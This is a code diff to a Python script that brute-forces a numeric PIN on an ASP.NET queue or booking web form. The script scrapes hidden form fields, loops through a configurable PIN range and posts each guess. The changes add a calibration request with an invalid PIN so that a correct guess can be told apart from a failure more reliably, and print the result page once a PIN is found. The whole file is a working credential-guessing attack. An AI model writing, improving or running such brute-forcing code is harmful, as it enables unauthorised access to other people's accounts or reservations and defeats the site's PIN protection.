@@ -18,9 +18,6 @@ SESSION.headers.update({
     "Referer": settings.URL,
 })
 
-SUCCESS_KEYWORDS = ["queue", "thank", "welcome", "success", "joined", "position", "waiting"]
-FAILURE_KEYWORDS = ["invalid", "incorrect", "wrong", "error", "not found", "failed"]
-
 
 def get_form_fields(html: str) -> dict:
     """Extract all form input fields (including hidden) from ASP.NET page."""
@@ -39,6 +36,14 @@ def get_form_fields(html: str) -> dict:
     return fields
 
 
+def get_visible_text(html: str) -> str:
+    """Extract only human-readable text, stripping all HTML tags."""
+    soup = BeautifulSoup(html, "html.parser")
+    for tag in soup(["script", "style", "input", "select", "option"]):
+        tag.decompose()
+    return " ".join(soup.get_text(separator=" ").split()).lower()
+
+
 def find_field(fields: dict, *keywords) -> str | None:
     """Find a field name that contains any of the given keywords (case-insensitive)."""
     for key in fields:
@@ -48,23 +53,9 @@ def find_field(fields: dict, *keywords) -> str | None:
     return None
 
 
-def is_success(response_text: str, baseline_text: str) -> bool:
-    text = response_text.lower()
-    baseline = baseline_text.lower()
-
-    for kw in SUCCESS_KEYWORDS:
-        if kw in text and kw not in baseline:
-            return True
-
-    for kw in FAILURE_KEYWORDS:
-        if kw in baseline and kw not in text:
-            return True
-
-    if len(response_text) != len(baseline_text):
-        if any(kw in text for kw in SUCCESS_KEYWORDS):
-            return True
-
-    return False
+def is_success(response_text: str, failure_text: str) -> bool:
+    """Compare visible text of response against a known-failure baseline."""
+    return get_visible_text(response_text) != failure_text
 
 
 def get_form_action(html: str, base_url: str) -> str:
@@ -79,14 +70,30 @@ def get_form_action(html: str, base_url: str) -> str:
     return base_url
 
 
+def build_payload(fields: dict, name_field, phone_field, pin_field, adults_field, children_field, pin: int) -> dict:
+    payload = fields.copy()
+    if name_field and settings.NAME:
+        payload[name_field] = settings.NAME
+    payload[phone_field] = settings.PHONE
+    payload[pin_field] = str(pin)
+    if adults_field:
+        payload[adults_field] = str(settings.ADULTS)
+    if children_field:
+        payload[children_field] = str(settings.CHILDREN)
+    return payload
+
+
+def fetch_fresh(url: str) -> tuple[dict, str]:
+    """GET the page and return (form_fields, raw_html)."""
+    resp = SESSION.get(url, timeout=15)
+    resp.raise_for_status()
+    return get_form_fields(resp.text), resp.text
+
+
 def main():
     print(f"[*] Fetching page: {settings.URL}")
-    resp = SESSION.get(settings.URL, timeout=15)
-    resp.raise_for_status()
-    baseline_html = resp.text
-
-    fields = get_form_fields(baseline_html)
-    action_url = get_form_action(baseline_html, settings.URL)
+    fields, page_html = fetch_fresh(settings.URL)
+    action_url = get_form_action(page_html, settings.URL)
 
     print(f"[*] Form action: {action_url}")
     print(f"[*] Discovered {len(fields)} form fields:")
@@ -94,11 +101,11 @@ def main():
         display = val if len(val) < 60 else val[:57] + "..."
         print(f"    {name!r} = {display!r}")
 
-    name_field = find_field(fields, "name", "fullname", "username", "cust")
-    phone_field = find_field(fields, "phone", "mobile", "tel", "handphone", "contact", "hp", "no")
-    pin_field = find_field(fields, "pin", "password", "pass", "pwd", "code", "ic")
-    adults_field = find_field(fields, "adult", "pax", "guest")
-    children_field = find_field(fields, "child", "kid", "children")
+    name_field     = find_field(fields, "name", "fullname", "username", "cust")
+    phone_field    = find_field(fields, "phone", "mobile", "tel", "handphone", "contact", "hp", "no")
+    pin_field      = find_field(fields, "pin", "password", "pass", "pwd", "code", "ic")
+    adults_field   = find_field(fields, "adult", "pax", "guest", "DDLP1")
+    children_field = find_field(fields, "child", "kid", "children", "DDLP2")
 
     print(f"\n[*] Detected name field    : {name_field!r}")
     print(f"[*] Detected phone field   : {phone_field!r}")
@@ -116,6 +123,14 @@ def main():
         print("\n[!] PHONE is not set in .env")
         sys.exit(1)
 
+    # Calibrate: POST with a clearly invalid PIN to capture what a failure looks like
+    print("\n[*] Calibrating failure baseline...")
+    cal_fields, _ = fetch_fresh(settings.URL)
+    cal_payload = build_payload(cal_fields, name_field, phone_field, pin_field, adults_field, children_field, pin=0)
+    cal_resp = SESSION.post(action_url, data=cal_payload, timeout=15, allow_redirects=True)
+    failure_visible = get_visible_text(cal_resp.text)
+    print(f"[*] Failure page text: {failure_visible[:120]}...")
+
     print(f"\n[*] Name  : {settings.NAME or '(not set)'}")
     print(f"[*] Phone : {settings.PHONE}")
     print(f"[*] Adults: {settings.ADULTS}  Children: {settings.CHILDREN}")
@@ -126,19 +141,8 @@ def main():
     total = settings.PIN_END - settings.PIN_START + 1
 
     for pin in range(settings.PIN_START, settings.PIN_END + 1):
-        # Re-fetch page each time to get fresh VIEWSTATE / EVENTVALIDATION
-        page_resp = SESSION.get(settings.URL, timeout=15)
-        fresh_fields = get_form_fields(page_resp.text)
-
-        payload = fresh_fields.copy()
-        if name_field and settings.NAME:
-            payload[name_field] = settings.NAME
-        payload[phone_field] = settings.PHONE
-        payload[pin_field] = str(pin)
-        if adults_field:
-            payload[adults_field] = str(settings.ADULTS)
-        if children_field:
-            payload[children_field] = str(settings.CHILDREN)
+        fresh_fields, _ = fetch_fresh(settings.URL)
+        payload = build_payload(fresh_fields, name_field, phone_field, pin_field, adults_field, children_field, pin)
 
         try:
             post_resp = SESSION.post(action_url, data=payload, timeout=15, allow_redirects=True)
@@ -151,9 +155,10 @@ def main():
         pct = progress / total * 100
         print(f"\r[{progress}/{total}] {pct:.1f}%  Trying PIN: {pin:05d} | HTTP {post_resp.status_code}", end="", flush=True)
 
-        if is_success(post_resp.text, baseline_html):
+        if is_success(post_resp.text, failure_visible):
             print(f"\n\n[+] SUCCESS! PIN found: {pin}")
             print(f"[+] Response URL: {post_resp.url}")
+            print(f"[+] Page text: {get_visible_text(post_resp.text)[:300]}")
             return
 
         if settings.DELAY > 0:
